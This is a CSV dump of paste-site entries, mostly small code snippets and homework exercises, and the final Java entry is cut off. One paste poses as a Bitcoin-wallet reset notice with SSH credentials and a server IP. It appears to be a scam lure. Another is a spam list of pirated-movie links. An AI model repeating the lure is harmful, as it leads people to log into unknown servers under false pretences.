id,title,username,language,date,content
nGULQMWN,111,MagmaLP,Lua,Sunday 3rd of December 2023 11:44:36 AM CDT,"-- Funktion, um die Datei mit dem Standard-Editor zu öffnen
function openFileInEditor(filename)
    -- Der Befehl kann je nach Betriebssystem variieren
    local os_type = io.popen(""uname""):read(""*l"") -- Lies das Betriebssystem (für Unix-basierte Systeme)
    local command = """"

    -- Befehl zur Dateiöffnung je nach Betriebssystem
    if os_type == ""Windows"" then
        command = ""start "" .. filename -- Der Befehl für Windows
    else
        command = ""open "" .. filename -- Der Befehl für Unix-basierte Systeme (z.B. macOS, Linux)
    end

    -- Ausführen des Befehls in der Konsole
    os.execute(command)
end

-- Benutzereingabe für den Dateinamen
io.write(""Gib den Dateinamen ein, den du öffnen möchtest: "")
local filename = io.read()

-- Aufruf der Funktion, um die Datei zu öffnen
openFileInEditor(1)
"
kZLTM6g5,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Sunday 3rd of December 2023 11:21:19 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-516545"
sjXUPhyD,Untitled,Nanoic,C++,Sunday 3rd of December 2023 11:07:43 AM CDT,"#include <iostream>
using namespace std;

int main()
{
    std::cout << ""Hello World!\n"";
    int n = 0;

    cout << n << endl;

    while (n < 100){       
        
        n++;

        if (n / 2 == 0) {
            n = 3 * n + 1;
            cout << n  << endl;
        }
        else if (n / 2 == 1) {
            
            cout << n  << endl;
            n++;
            
        }
    }

}
"
QjWxz1pL,jquery_dinamic_page,dhiforester,PHP,Sunday 3rd of December 2023 11:06:05 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
    <head>
        <meta charset=""UTF-8"">
        <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
        <title>My Aplication</title>
        <link href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"" rel=""stylesheet"" integrity=""sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"" crossorigin=""anonymous"">
        <script src=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"" integrity=""sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"" crossorigin=""anonymous""></script>
        <link rel=""canonical"" href=""https://getbootstrap.com/docs/5.3/examples/navbar-fixed/"">
        <link rel=""stylesheet"" href=""https://cdn.jsdelivr.net/npm/@docsearch/css@3"">
        <link href=""css/style.css"" rel=""stylesheet"">
    </head>
    <body class=""bg-info"">
        <nav class=""navbar navbar-expand-md navbar-dark fixed-top bg-dark"">
            <div class=""container-fluid"">
                <a class=""navbar-brand"" href="""">My Aplication</a>
                <button class=""navbar-toggler"" type=""button"" data-bs-toggle=""collapse"" data-bs-target=""#navbarCollapse"" aria-controls=""navbarCollapse"" aria-expanded=""false"" aria-label=""Toggle navigation"">
                    <span class=""navbar-toggler-icon""></span>
                </button>
                <div class=""collapse navbar-collapse"" id=""navbarCollapse"">
                    <ul class=""navbar-nav me-auto mb-2 mb-md-0"">
                        <li class=""nav-item"">
                            <a class=""nav-link active"" aria-current=""page"" href="""">Home</a>
                        </li>
                        <li class=""nav-item"">
                            <a class=""nav-link"" href=""javascript:void(0);"" id=""KeHalaman1"">Halaman-1</a>
                        </li>
                        <li class=""nav-item"">
                            <a class=""nav-link"" href=""javascript:void(0);"" id=""KeHalaman2"">Halaman-2</a>
                        </li>
                        <li class=""nav-item"">
                            <a class=""nav-link"" href=""javascript:void(0);"" id=""KeHalaman3"">Halaman-3</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <main class=""container"">
            <div class=""bg-body-tertiary p-5 rounded"" id=""MenampilkanHalaman"">
                
            </div>
        </main>
    </body>
</html>"
TG7zg7SG,Count number of hops,jayati,C++,Sunday 3rd of December 2023 11:02:24 AM CDT,"//{ Driver Code Starts
#include <bits/stdc++.h>
using namespace std;

// } Driver Code Ends

class Solution
{
    public:
    //Function to count the number of ways in which frog can reach the top.
    long long countWays(int n)
    {
          int mod = 1000000007;
        long long dp[n+1];
        dp[0] = 1;
        
        for(int i=1;i<n+1;i++) 
            dp[i] = 0;
            
        for(int i=1;i<n+1;i++){
            dp[i] += dp[i-1]%mod;
            
            if(i>1)
                dp[i] += dp[i-2]%mod;
            if(i>2)
                dp[i] += dp[i-3]%mod;
        }
        return dp[n]%mod;
        
    }
};


//{ Driver Code Starts.
int main()
{
    //taking testcases
	int t;
	cin >> t;
	
	while(t--)
	{
	    //taking number of steps in stair
		int n;
		cin>>n;
		Solution ob;
		//calling function countWays()
		cout << ob.countWays(n) << endl;
	}
    
    return 0;
    
}

// } Driver Code Ends"
g3UC2uma,Finding least time for curves,NUCLEARESOL,C#,Sunday 3rd of December 2023 11:00:57 AM CDT,"using System;
using System.Diagnostics;
using System.Threading;
using System.Globalization;

class Program
{

    static void Main()
    {
        int version = 1;
        string type = ""circle"";
        double gravitationalA = 9.81d;
        double[] startPoint = { 5,10};
        double[] endpoint = { 0, 0 };
        const Boolean calculateDistance = false;

        Console.WriteLine(""Following Variables are used:"");
        Console.WriteLine(""Gravitational Accel: "" + gravitationalA + "" m/s"");
        Console.WriteLine(""Goal: "" + endpoint[0] + "","" + endpoint[1]);
        Console.WriteLine(""Start: "" + startPoint[0] + "","" + startPoint[1]);
        Console.WriteLine(""Calculate Distance"" + calculateDistance);
        Console.WriteLine(""y/n"");
        string confirmation = Console.ReadLine();

        if (confirmation != ""y"")
        {
            Console.WriteLine("""");
            Console.WriteLine(""Abort, Please change the variable"");
            Console.WriteLine(""graph type"");
            type = Console.ReadLine();
            Console.WriteLine(""Gravitational Acceleration"");
            gravitationalA = double.Parse(Console.ReadLine(), CultureInfo.InvariantCulture.NumberFormat);
            Console.WriteLine(""Start Point X"");
            startPoint[0] = double.Parse(Console.ReadLine(), CultureInfo.InvariantCulture.NumberFormat);
            Console.WriteLine(""Start Point Y"");
            startPoint[1] = double.Parse(Console.ReadLine(), CultureInfo.InvariantCulture.NumberFormat);
            Console.WriteLine("""");
            Console.WriteLine(""Following Variables are used:"");
            Console.WriteLine(""Gravitational Accel: "" + gravitationalA + "" m/s"");
            Console.WriteLine(""Goal: "" + endpoint[0] + "","" + endpoint[1]);
            Console.WriteLine(""Start: "" + startPoint[0] + "","" + startPoint[1]);
            //Thread.Sleep(3000);
        }

        // Console.WriteLine("""");
        // Console.WriteLine(""Starting calculation"");
        double x = startPoint[0];
        double velX = 0f;
        const double timestep = 0.0001f;
        double time = 0f;
        double initialCollvar = 1;
        double initialCollvarStep = 0.1f;
        double zeroInAccuracy = 0.0001f;
        double maxTime = double.PositiveInfinity;
        double limit = 400;
        string strg = """";
        Console.WriteLine(limit);
        var start = Process.GetCurrentProcess().TotalProcessorTime;
        int i = 0;
        static double NewtonsMethod(double target, double initialGuess, double tolerance, int maxIterations)
        {
            double x = initialGuess;

            for (int i = 0; i < maxIterations; i++)
            {
                double fx = (2 * x - Math.Sin(2 * x)) / (1 - Math.Cos(2 * x));
                double derivative = -2 * ((x / Math.Tan(x)) - 1) * Math.Pow(1 / Math.Sin(x), 2);
                Console.WriteLine(x + "" "" + fx + "" "" + derivative);
                //Thread.Sleep(1000);
                if (Math.Abs(fx - target) < tolerance)
                {
                    Console.WriteLine($""Converged after {i} iterations."");
                    return x;
                }

                x = x - (fx - target) / derivative;
            }

            Console.WriteLine(""Did not converge within the specified number of iterations."");
            return x;
        }

        Tuple<double, double> calculateAcceleration(double X, double collVar, double depvar1, double depvar2)
        {
            double localSlope = 2.0f * collVar * (X - depvar1);

            //Console.WriteLine(-(float)(Math.Cos(Math.Atan(1f / localSlope)) * Math.Sin(Math.Atan(1f / localSlope)) * gravitationalA));
            return Tuple.Create(-(double)(Math.Cos(Math.Atan(1f / localSlope)) * Math.Sin(Math.Atan(1f / localSlope)) * gravitationalA), localSlope);
        }
        Tuple<double, double> calculateAccelerationCircle(double X, double Y, double collVar, double h, double k)
        {
            double localSlope = (h - X) / (Y - k);

            //return -(float)(Math.Cos(Math.Atan(1f / localSlope)) * Math.Sin(Math.Atan(1f / localSlope)) * gravitationalA);
            return Tuple.Create(-(double)(Math.Cos(Math.Atan(1f / localSlope)) * Math.Sin(Math.Atan(1f / localSlope)) * gravitationalA), localSlope);
        }
        Tuple<double, double> calculateAccelerationCubic(double X, double collVar, double h, double k)
        {
            double localSlope = collVar*3.0d*Math.Pow(X-h,2.0);

            //return -(float)(Math.Cos(Math.Atan(1f / localSlope)) * Math.Sin(Math.Atan(1f / localSlope)) * gravitationalA);
            return Tuple.Create(-(double)(Math.Cos(Math.Atan(1f / localSlope)) * Math.Sin(Math.Atan(1f / localSlope)) * gravitationalA), localSlope);
        }

        Console.WriteLine(strg);
        Console.WriteLine("""");
        strg = """";
        Tuple<double, double, double, double> CalculateTimeParabola(double initialCollvar)
        {
            double h = 0;
            double k = 0;
            double distance = 0;
            double deltaX = 0;
            i = i + 1;
            x = startPoint[0];
            velX = 0f;
            time = 0f;
            distance = 0f;
            h = 0.5f * (startPoint[0] - (startPoint[1] / (startPoint[0] * initialCollvar)));
            k = -initialCollvar * (double)Math.Pow(h, 2);
            while (x >= 0 && time < limit)
            {
                Tuple<double, double> calculatedVales = calculateAcceleration(x, initialCollvar, h, k);
                deltaX = (double)(velX * timestep + 0.5f * calculatedVales.Item1 * Math.Pow(timestep, 2));
                x = (double)(x + deltaX);
                velX = velX + (0 + calculateAcceleration(x, initialCollvar, h, k).Item1) * timestep / 1f;
                if (calculateDistance)
                {
                    distance = distance + (double)Math.Sqrt(deltaX * deltaX * (calculatedVales.Item2 * calculatedVales.Item2 + 1.0f));
                }
                time = time + timestep;
            }
            Console.WriteLine(Math.Abs(Math.Abs(initialCollvarStep) * 100 - 100) + "" % complete"");

            return Tuple.Create(time, initialCollvar, h, k);
        }

        Tuple<double, double, double, double> CalculateTimeCircle(double initialCollvar)
        {
            if (initialCollvar < (double)Math.Sqrt(Math.Pow(startPoint[1], 2) + Math.Pow((Math.Pow(startPoint[1], 2) - Math.Pow(startPoint[0], 2)) / (-2 * startPoint[0]), 2)))
            {
                return Tuple.Create(limit, initialCollvar, 0.0d, 0.0d);
            }
            double q = Math.Sqrt(Math.Pow(startPoint[1], 2) + Math.Pow(startPoint[0], 2));
            double x3 = startPoint[0] / 2;
            double y3 = startPoint[1] / 2;


            double h = x3 + (Math.Sqrt(Math.Pow(initialCollvar, 2) - Math.Pow(q / 2, 2)) * (-startPoint[1])) / q;
            double k = y3 + (Math.Sqrt(Math.Pow(initialCollvar, 2) - Math.Pow(q / 2, 2)) * (startPoint[0])) / q;

            double distance = 0;
            double deltaX = 0;

            x = startPoint[0];
            velX = 0f;
            time = 0f;
            distance = 0f;
            double y = k - Math.Sqrt(Math.Pow(initialCollvar, 2) - Math.Pow(x - h, 2));
            while (x >= 0 && time < limit)
            {
                y = k - Math.Sqrt(Math.Pow(initialCollvar, 2) - Math.Pow(x - h, 2));
                Tuple<double, double> calculatedVales = calculateAccelerationCircle(x, y, initialCollvar, h, k);
                deltaX = (double)(velX * timestep + 0.5f * calculatedVales.Item1 * Math.Pow(timestep, 2));
                x = (double)(x + deltaX);
                velX = velX + (0 + calculateAccelerationCircle(x, y, initialCollvar, h, k).Item1) * timestep / 1f;
                if (calculateDistance)
                {
                    distance = distance + (double)Math.Sqrt(deltaX * deltaX * (calculatedVales.Item2 * calculatedVales.Item2 + 1.0f));
                }
                time = time + timestep;
            }

            return Tuple.Create(time, initialCollvar, h, k);
        }
        Tuple<double, double, double, double> CalculateTimeCubic(double initialCollvar)
        {
            double h = 0;
            double k = 0;
            double distance = 0;
            double deltaX = 0;
            i = i + 1;
            x = startPoint[0];
            velX = 0f;
            time = 0f;
            distance = 0f;
            if (initialCollvar <= 0.00001 |initialCollvar >= 12.0 * startPoint[1] / (3.0 * Math.Pow(startPoint[0], 3)))
            {
                return Tuple.Create(limit+100, initialCollvar, h, k);
            }

            h = (3.0d * Math.Pow(startPoint[0], 2) - Math.Sqrt(9.0d * Math.Pow(startPoint[0], 4) - 4.0 * 3.0 * startPoint[0] * (Math.Pow(startPoint[0], 3) - startPoint[1] / initialCollvar)))/2;
            k = initialCollvar * (double)Math.Pow(h, 3);
            while (x >= 0 && time < limit)
            {
                Tuple<double, double> calculatedVales = calculateAccelerationCubic(x, initialCollvar, h, k);
                deltaX = (double)(velX * timestep + 0.5f * calculatedVales.Item1 * Math.Pow(timestep, 2));
                x = (double)(x + deltaX);
                velX = velX + (0 + calculateAccelerationCubic(x, initialCollvar, h, k).Item1) * timestep / 1f;
                if (calculateDistance)
                {
                    distance = distance + (double)Math.Sqrt(deltaX * deltaX * (calculatedVales.Item2 * calculatedVales.Item2 + 1.0f));
                }
                time = time + timestep;
            }
            Console.WriteLine(Math.Abs(Math.Abs(initialCollvarStep) * 100 - 100) + "" % complete"");

            return Tuple.Create(time, initialCollvar, h, k);
        }

        Tuple<double, double, double, double, double, double> jumpingDecend()
        {
            //   Console.WriteLine(Math.Abs(initialCollvarStep)+"",""+zeroInAccuracy);
            double var1 = 0;
            double var2 = 0;
            double var3 = 0;
            double var4 = 0;
            if (type == ""parabola"")
            {
                var1 = 0;
                var2 = 0;
            }
            if (type == ""circle"")
            {
                initialCollvar = (double)Math.Sqrt(Math.Pow(startPoint[1], 2) + Math.Pow((Math.Pow(startPoint[1], 2) - Math.Pow(startPoint[0], 2)) / (-2 * startPoint[0]), 2));
                //  Console.WriteLine(initialCollvar+""RADIUS"");
            }
            if (type == ""cubic"")
            {
                initialCollvar = (12.0 * startPoint[1] / (3.0 * Math.Pow(startPoint[0], 3)))/2;
                initialCollvarStep = (12.0 * startPoint[1] / (3.0 * Math.Pow(startPoint[0], 3))) / 10;
                zeroInAccuracy = (12.0 * startPoint[1] / (3.0 * Math.Pow(startPoint[0], 3))) / 100000;
                Console.WriteLine(initialCollvar+""RADIUS"");
            }

            while (Math.Abs(initialCollvarStep) >= zeroInAccuracy)
            {
                // --  Console.Write(""BOB"");
                initialCollvar = initialCollvar + initialCollvarStep;
                if (type == ""parabola"")
                {
                    time = CalculateTimeParabola(initialCollvar).Item1;
                }
                else if (type == ""circle"")
                {
                    time = CalculateTimeCircle(initialCollvar).Item1;
                }
                else if (type == ""cubic"")
                {
                    time = CalculateTimeCubic(initialCollvar).Item1;
                }
                // Console.WriteLine(distance);
                //  Console.WriteLine(initialCollvar + ""(x-"" + h + "")^2+"" + k);
                strg = strg + ""("" + initialCollvar + "","" + time + "")"" + "","";
                if (maxTime > time)
                {
                    maxTime = time;
                    initialCollvarStep = initialCollvarStep * 2;
                }

                else if (time > maxTime)
                {
                    if (time >= limit)
                    {
                        initialCollvar = initialCollvar - initialCollvarStep;
                        initialCollvarStep = -initialCollvarStep / 4;
                    }
                    else
                    {
                        initialCollvarStep = -initialCollvarStep;
                    }
                }
                else
                {
                    initialCollvarStep = initialCollvarStep / 2;
                }
            }
            if (type == ""circle"")
            {
                Tuple<double, double, double, double> resultcal = CalculateTimeCircle(initialCollvar);
                time = CalculateTimeCircle(initialCollvar).Item1;
                var1 = resultcal.Item1;
                var2 = resultcal.Item3;
                var3 = resultcal.Item4;
            }
            else if (type == ""parabola"")
            {
                Tuple<double, double, double, double> resultcal = CalculateTimeParabola(initialCollvar);
                time = CalculateTimeParabola(initialCollvar).Item1;
                var1 = resultcal.Item2;
                var2 = resultcal.Item3;
                var3 = resultcal.Item4;
            }
            else if (type == ""cubic"")
            {
                Tuple<double, double, double, double> resultcal = CalculateTimeCubic(initialCollvar);
                time = CalculateTimeCubic(initialCollvar).Item1;
                var1 = resultcal.Item2;
                var2 = resultcal.Item3;
                var3 = resultcal.Item4;
            }
            if (time > limit)
            {

                if (type == ""circle"")
                {
                    initialCollvar = initialCollvar - initialCollvarStep / 2;
                    Tuple<double, double, double, double> resultcal = CalculateTimeCircle(initialCollvar);
                    time = resultcal.Item1;
                    var1 = resultcal.Item2;
                    var2 = resultcal.Item3;
                    var3 = resultcal.Item4;
                }
                else if (type == ""parabola"")
                {
                    initialCollvar = initialCollvar - initialCollvarStep / 2;
                    Tuple<double, double, double, double> resultcal = CalculateTimeParabola(initialCollvar);
                    time = resultcal.Item1;
                    var1 = resultcal.Item2;
                    var2 = resultcal.Item3;
                    var3 = resultcal.Item4;
                }
                else if (type == ""cubic"")
                {
                    initialCollvar = initialCollvar - initialCollvarStep / 2;
                    Tuple<double, double, double, double> resultcal = CalculateTimeCubic(initialCollvar);
                    time = resultcal.Item1;
                    var1 = resultcal.Item2;
                    var2 = resultcal.Item3;
                    var3 = resultcal.Item4;
                }
            }
            Console.WriteLine(""Finished"");
            return Tuple.Create(initialCollvar, time, var1, var2, var3, var4);
        }
        Tuple<double, double, double, double, double, double> resultTuple = jumpingDecend();
        var stop = Process.GetCurrentProcess().TotalProcessorTime;

        Console.WriteLine("""");
        Console.WriteLine(""time taken "" + resultTuple.Item2 + "" seconds"");
        Console.WriteLine(""At variable = "" + resultTuple.Item1);
        Console.WriteLine(""h = "" + resultTuple.Item4);
        Console.WriteLine(""k = "" + resultTuple.Item5);
        Console.WriteLine();
        // stopwatch.Stop();
        Console.WriteLine("""");
        Console.WriteLine(""Calculation Time is "" + (stop - start).TotalMilliseconds);
        Console.WriteLine(""Cal amt"" + i);
      //  Console.WriteLine(""Starting control group in 5 seconds"");
        Console.WriteLine(strg);
        Thread.Sleep(20000);
        start = Process.GetCurrentProcess().TotalProcessorTime;
        double theta = NewtonsMethod(startPoint[0] / startPoint[1],1,1e-20,2000);
        double D = 2 * startPoint[1] / (1 - Math.Cos(theta * 2));
        Console.WriteLine(D);
        double t = Math.Sqrt(2*D/gravitationalA)*theta;
        Console.WriteLine(t);
        stop = Process.GetCurrentProcess().TotalProcessorTime;
        Console.WriteLine(""Calculation Time is "" + (stop - start).TotalMilliseconds);
        strg = """";
    }
}"
cGENuuMx,L8 - Source,alaniarati,JavaScript,Sunday 3rd of December 2023 10:54:56 AM CDT,"import axios from ""axios"";
import { useState, useEffect } from ""react"";

const MyComponent = () => {
  // State to store the fetched data
  const [data, setData] = useState([]);

  useEffect(() => {
    // Function to fetch data
    const fetchData = async () => {
      try {
        // Fetching data from JSONPlaceholder using Axios
        const response = await axios.get(
          ""https://jsonplaceholder.typicode.com/posts""
        );
        // Update the state with the fetched data
        setData(response.data);
      } catch (error) {
        console.error(""Error fetching data:"", error);
      }
    };

    // Call the fetchData function
    fetchData();
  }, []); // Empty dependency array ensures this effect runs only once on mount

  return (
    <div>
      <h1>Data from JSONPlaceholder</h1>
      <ul>
        {/* Mapping over the data and rendering each item */}
        {data.map((item) => (
          <li key={item.id}>{item.title}</li>
        ))}
      </ul>
    </div>
  );
};

export default MyComponent;
"
Wb8aN9zQ,Untitled,VolinNilov,C++,Sunday 3rd of December 2023 10:41:55 AM CDT,"#include <iostream>
using namespace std;

class Matrix
{
private:
	int rows, cols;
	int** data;
public:
	Matrix(int r, int c)
	{
		rows = r;
		cols = c;
		data = new int* [rows];
		for (int i = 0; i < rows; i++)
		{
			data[i] = new int[cols];
		}
	}
	void set(int i, int j, int val)
	{
		data[i][j] = val;
	}
	int get(int i, int j)
	{
		return data[i][j];
	}
	Matrix add(Matrix m)
	{
		Matrix result(rows, cols);
		for (int i = 0; i < rows; i++)
		{
			for (int j = 0; j < cols; j++)
			{
				result.set(i, j, data[i][j] + m.get(i, j));
			}
		}
		return result;
	}
	Matrix subtract(Matrix m)
	{
		Matrix result(rows, cols);
		for (int i = 0; i < rows; i++)
		{
			for (int j = 0; j < cols; j++)
			{
				result.set(i, j, data[i][j] - m.get(i, j));
			}
		}
		return result;
	}
	Matrix multiply(Matrix m)
	{
		Matrix result(rows, cols);
		for (int i = 0; i < rows; i++)
		{
			for (int j = 0; j < cols; j++)
			{
				int sum = 0; 
				for (int t = 0; t < cols; t++)
				{
					sum = sum + data[i][t] * m.get(t, j);
				}
				result.set(i, j, sum);
			}
		}
		return result;
	}
};

int main()
{
	Matrix m1(2, 2);
	m1.set(0, 0, 1);
	m1.set(0, 1, 2);
	m1.set(1, 0, 3);
	m1.set(1, 1, 4);

	Matrix m2(2, 2);
	m2.set(0, 0, 5);
	m2.set(0, 1, 6);
	m2.set(1, 0, 7);
	m2.set(1, 1, 8);

	Matrix m3 = m1.add(m2);
	Matrix m4 = m1.subtract(m2);
	Matrix m5 = m1.multiply(m2);

	cout << ""Started matrix: "" << endl;
	cout << ""m1: "" << endl;
	cout << m1.get(0, 0) << "" "" << m1.get(0, 1) << endl;
	cout << m1.get(1, 0) << "" "" << m1.get(1, 1) << endl;
	cout << endl;

	cout << ""m2: "" << endl;
	cout << m2.get(0, 0) << "" "" << m2.get(0, 1) << endl;
	cout << m2.get(1, 0) << "" "" << m2.get(1, 1) << endl;
	cout << endl;

	cout << ""ADD: "" << endl;
	cout << m3.get(0, 0) << "" "" << m3.get(0, 1) << endl;
	cout << m3.get(1, 0) << "" "" << m3.get(1, 1) << endl;
	cout << endl;

	cout << ""SUBTRACT: "" << endl;
	cout << m4.get(0, 0) << "" "" << m4.get(0, 1) << endl;
	cout << m4.get(1, 0) << "" "" << m4.get(1, 1) << endl;
	cout << endl;
	
	cout << ""MULTIPLY: "" << endl;
	cout << m5.get(0, 0) << "" "" << m5.get(0, 1) << endl;
	cout << m5.get(1, 0) << "" "" << m5.get(1, 1) << endl;
	cout << endl;

	return 0;
}"
0962EEQC,segseh,gadungw71,PHP,Sunday 3rd of December 2023 10:30:21 AM CDT,"<a href=""https://bio.link/teeyodfullhdthai4k"">https://bio.link/teeyodfullhdthai4k</a>

<a href=""https://bio.link/filmteeyodhdfullthai"">https://bio.link/filmteeyodhdfullthai</a>

<a href=""https://bio.link/teeyodfullhd1080p"">https://bio.link/teeyodfullhd1080p</a>

<a href=""https://bio.link/edezx"">https://bio.link/edezx</a>

<a href=""https://bio.link/awertyty"">https://bio.link/awertyty</a>

<a href=""https://bio.link/wonkafullhdthai4k"">https://bio.link/wonkafullhdthai4k</a>

<a href=""https://bio.link/wonkathai"">https://bio.link/wonkathai</a>

<a href=""https://bio.link/wonkathaisubhd4k"">https://bio.link/wonkathaisubhd4k</a>

<a href=""https://bio.link/wonkahdthai1080"">https://bio.link/wonkahdthai1080</a>

<a href=""https://groups.google.com/g/comp.arch.fpga/c/b_cqYrxYltU"">https://groups.google.com/g/comp.arch.fpga/c/b_cqYrxYltU</a>

<a href=""https://groups.google.com/g/comp.text.tex/c/S-lOaxWdrdk"">https://groups.google.com/g/comp.text.tex/c/S-lOaxWdrdk</a>

<a href=""https://groups.google.com/g/comp.text.tex/c/Fl_9Pq3VfoY"">https://groups.google.com/g/comp.text.tex/c/Fl_9Pq3VfoY</a>

<a href=""https://groups.google.com/g/comp.arch.fpga/c/X4CoyiyIj3M"">https://groups.google.com/g/comp.arch.fpga/c/X4CoyiyIj3M</a>

<a href=""https://groups.google.com/g/mozilla.dev.platform/c/WXO0D5RjcEc"">https://groups.google.com/g/mozilla.dev.platform/c/WXO0D5RjcEc</a>

<a href=""https://baskadia.com/post/1aupf"">https://baskadia.com/post/1aupf</a>

<a href=""https://baskadia.com/post/1av2x"">https://baskadia.com/post/1av2x</a>

<a href=""https://hackmd.io/@rerewilli6/ByG8YQcBp"">https://hackmd.io/@rerewilli6/ByG8YQcBp</a>

<a href=""https://rentry.co/79mghw"">https://rentry.co/79mghw</a>

<a href=""https://pastelink.net/waf923co"">https://pastelink.net/waf923co</a>

<a href=""https://snippet.host/kgroib"">https://snippet.host/kgroib</a>

<a href=""https://glot.io/snippets/gr69igc3m4"">https://glot.io/snippets/gr69igc3m4</a>

<a href=""https://etextpad.com/uogi7tahg1"">https://etextpad.com/uogi7tahg1</a>

<a href=""https://homment.com/yy4nyofKDo03pTQkRyS4"">https://homment.com/yy4nyofKDo03pTQkRyS4</a>

<a href=""https://jsbin.com/honoqedute/edit?html,output"">https://jsbin.com/honoqedute/edit?html,output</a>
"
L4M8bt4W,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 10:22:26 AM CDT,"file = open('17_11887.txt')
A = list(map(int, file.readlines()))
count = 0
for i in range(len(A) + 3):
    B = []
    B += [A[i]]
    B += [A[i-1]]
    B += [A[i-2]]
    B += [A[i-3]]
    B = B.sort()
    if (B[0] // 10 < 10 and B[1] // 10 >= 10) or (B[0] // 10 < 10 and B[3] // 10 < 10):
        count += 1
print(count)  "
z0bYrREM,pygame-law-of-universal-gravitation,Xnork,Python,Sunday 3rd of December 2023 10:21:58 AM CDT,"import pygame, math
from pygame.locals import *

SCALE = 10 ** -6.58
REAL_RADIUS_OF_EARTH = 6_371 * 10 ** 3
REAL_RADIUS_OF_SUN = 696_340 * 10 ** 3
G =  9.807

pygame.init()

display = pygame.display.set_mode((600, 600))
game_is_running = True
clock = pygame.time.Clock()

class Body:
  def __init__(self, position, radius = 50.0, density = 0.89) -> None:
    self.position = position
    self.radius = radius
    self.density = density
    self.mass = self.radius ** 2 * math.pi * self.density

    self.acceleration = [0, 0]
    self.velocity = [0, 0]

  def draw(self) -> None:
    pygame.draw.circle(display, (255, 255, 255), self.position, self.radius)

class LawOfUniversalGravitatoin:
  def __init__(self, body_a: Body, body_b: Body) -> None:
    self.body_a = body_a
    self.body_b = body_b

  def step(self) -> None:
    angle = math.atan2(self.body_b.position[1] - self.body_a.position[1], self.body_b.position[0] - self.body_a.position[0])
    magnitude = math.sqrt((self.body_b.position[0] - self.body_a.position[0]) ** 2 + (self.body_b.position[1] - self.body_a.position[1]) ** 2)

    F = G * (self.body_a.mass * self.body_b.mass) / magnitude

    self.body_a.acceleration[0] += math.cos(angle) * F / self.body_a.mass * SCALE
    self.body_a.velocity[0] = self.body_a.acceleration[0]
    self.body_a.acceleration[1] += math.sin(angle) * F / self.body_a.mass * SCALE
    self.body_a.velocity[1] = self.body_a.acceleration[1]
    self.body_a.position[1] += self.body_a.velocity[1]
    self.body_a.position[0] += self.body_a.velocity[0]

    self.body_b.acceleration[0] += math.cos(angle) * F / self.body_b.mass * SCALE
    self.body_b.velocity[0] = self.body_b.acceleration[1]
    self.body_b.acceleration[1] += math.sin(angle) * F / self.body_b.mass * SCALE
    self.body_b.velocity[1] = self.body_b.acceleration[1]
    self.body_b.position[1] += self.body_b.velocity[1]
    self.body_b.position[0] += self.body_b.velocity[0]

earth_body = Body([400, 100], REAL_RADIUS_OF_EARTH * SCALE)
earth_body.acceleration[0] = -0.5

sun_body = Body([400, 400], REAL_RADIUS_OF_SUN * SCALE)

law_of_universal_gravitation = LawOfUniversalGravitatoin(earth_body, sun_body)

while game_is_running:
  law_of_universal_gravitation.step()

  for event in pygame.event.get():
    if event.type == pygame.QUIT:
      game_is_running = False

  display.fill([20, 20, 20])  

  earth_body.draw()
  sun_body.draw()

  pygame.display.flip()
  clock.tick(120)

pygame.quit()"
innARbQy,Day 3 part 1,icarussiano,Python,Sunday 3rd of December 2023 09:54:48 AM CDT,"import re
with open(""input"") as file:
    data = file.read().splitlines()
num = []
sym = []
part1 = 0

for line in data:
    num.append([(int(m.group()),m.start(), m.end() - 1) for m in re.finditer(r'(\d+)', line)])
    sym.append([m.start() for m in re.finditer(r'[^\d.]', line)])

for i, x in enumerate(num):
    for n, s, e in x:
        if ((s - 1 in sym[i]) or (e + 1 in sym[i]) or
                (i != len(num) - 1 and any(x in sym[i + 1] for x in range(s - 1, e + 2))) or
                (i != 0 and any(x in sym[i - 1] for x in range(s - 1, e + 2)))):
            part1 += n

print(part1)"
JgS7KYyE,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 09:52:16 AM CDT,"from random import randint
A = [randint(1, 10000) for i in range(1000)]
Max = 0
for i in range(len(A)):
    for j in range(i + 11, len(A)):
        if (A[i] + A[j]) % 2 * 567 == 0:
            Max = max(Max, A[i] + A[j])
print(Max)"
V4atWuqi,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 09:42:36 AM CDT,"from random import randint
A = [randint(1, 10000) for i in range(1000)]
count = 0
for i in range(len(A)):
    for j in range(i + 8, len(A)):
        if abs(A[i] - A[j]) % 999 == 0:
            count += 1
print(count)"
XZyVv1cU,zadaca3labs5,cekozz,Java,Sunday 3rd of December 2023 09:41:02 AM CDT,"import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

class Node {
    int element;
    Node pred, succ;

    Node(int element) {
        this.element = element;
        this.pred = this.succ = null;
    }
}

public class BubbleSortDLL {

    Node begin;

    BubbleSortDLL() {
        this.begin = null;
    }


    void insert(int elem) {
        Node newNode = new Node(elem);
        if (begin == null) {
            begin = newNode;
        } else {
            Node temp = begin;
            while (temp.succ != null) {
                temp = temp.succ;
            }
            temp.succ = newNode;
            newNode.pred = temp;
        }
    }

    void bubbleSort() {
        if (begin == null || begin.succ == null) {

            return;
        }

        boolean swapped;
        Node last = null;

        do {
            swapped = false;
            Node current = begin;

            while (current.succ != last) {
                if (current.element > current.succ.element) {
                    swap(current, current.succ);
                    swapped = true;
                }
                current = current.succ;
            }

            last = current;
        } while (swapped);
    }


    void swap(Node node1, Node node2) {
        int temp = node1.element;
        node1.element = node2.element;
        node2.element = temp;
    }

    
    void printDLL() {
        Node temp = begin;
        while (temp != null) {
            System.out.print(temp.element + "" "");
            temp = temp.succ;
        }
        System.out.println();
    }

    public static void main(String[] args) throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));

        int n = Integer.parseInt(br.readLine());
        String[] nodes = br.readLine().split("" "");

        BubbleSortDLL list = new BubbleSortDLL();
        for (String node : nodes) {
